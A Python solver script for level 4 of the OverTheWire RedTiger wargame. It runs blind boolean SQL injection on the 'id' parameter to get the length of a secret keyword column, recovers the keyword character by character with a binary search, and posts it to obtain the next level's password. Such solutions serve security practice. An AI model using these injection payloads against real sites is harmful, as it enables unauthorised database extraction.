#!/usr/bin/env python3
import pickle
import tigers as tg


def main():
    base_name = 'level4_secret'
    url = "https://redtiger.labs.overthewire.org/level4.php"
    finds = 'keyword'  # What we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level4login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level4login=cooks['level4login'])

    # Find len of key
    len_of_key = tg.find_key_len(url,
                                 f"1 and if((select length({finds}) from {base_name}) %s",
                                 'id', '1 rows', cook)

    print(len_of_key)

    # Find key
    key = tg.find_binary(url,
                         f"1 and if((select ascii(mid({finds},%s,1)) from {base_name}) %s",
                         'id', '1 rows', 32, 126, len_of_key, cook)

    # Authorization
    data = dict(secretword=key, go='Go!')
    response = tg.get_request(url, data, cook, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    if ('level5login' not in cooks) or (cooks['level5login'] != passw):
        cooks['level5login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
